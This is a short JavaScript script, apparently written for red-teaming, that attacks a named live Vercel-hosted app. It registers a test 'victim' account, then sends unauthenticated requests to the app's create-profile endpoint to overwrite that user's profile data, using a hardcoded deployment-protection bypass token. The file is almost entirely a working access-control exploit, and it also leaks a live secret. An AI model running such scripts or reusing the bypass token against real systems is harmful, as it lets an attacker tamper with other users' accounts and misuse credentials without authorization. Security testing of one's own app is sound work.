const PROD = 'https://localit-42uykwyl7-nhattoann.vercel.app'
const BYPASS = 'w6XAcwiXyFf9Pea8I6zwVONXAhc8Xs9A'

async function req(url, init = {}) {
  const headers = { 'x-vercel-protection-bypass': BYPASS, ...init.headers }
  const r = await fetch(url, { ...init, headers })
  const text = await r.text()
  return { status: r.status, text }
}

const su = await req(`${PROD}/api/auth/signup`, {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ email: `redteam-victim-${Date.now()}@test.com`, password: 'password123', fullName: 'Victim', role: 'tourist' }),
})
console.log('SIGNUP:', su.status, su.text.slice(0, 200))
const victimId = JSON.parse(su.text).userId

const atk = await req(`${PROD}/api/auth/create-profile`, {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ userId: victimId, role: 'tourist', payload: { nationality: 'ATTACKER' }, autoConfirm: true }),
})
console.log('ATTACK autoConfirm:', atk.status, atk.text.slice(0, 400))

// Also try without autoConfirm, still no auth
const atk2 = await req(`${PROD}/api/auth/create-profile`, {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ userId: victimId, role: 'tourist', payload: { nationality: 'ATTACKER2' } }),
})
console.log('ATTACK no token/cookie:', atk2.status, atk2.text.slice(0, 400))
